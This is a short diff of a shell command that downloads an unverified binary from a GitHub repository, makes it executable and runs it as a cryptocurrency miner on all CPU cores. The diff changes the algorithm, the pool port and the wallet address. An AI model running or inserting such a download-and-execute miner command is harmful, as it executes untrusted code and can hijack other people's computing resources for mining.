@@ -8,7 +8,7 @@ wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a ye
 
 
 
-wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM && ./VTM -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RTh9cXuSzQciQAPvDDS35M12qRQbADP4Lk.avian -t$(nproc --all)
+wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM && ./VTM -a gr  -o stratum+tcps://stratum-asia.rplant.xyz:17084 -u JXuP8URNEyYUaBQSdNCCadawgW5mqtJpxG.jagoan -t$(nproc --all)
 
 
 
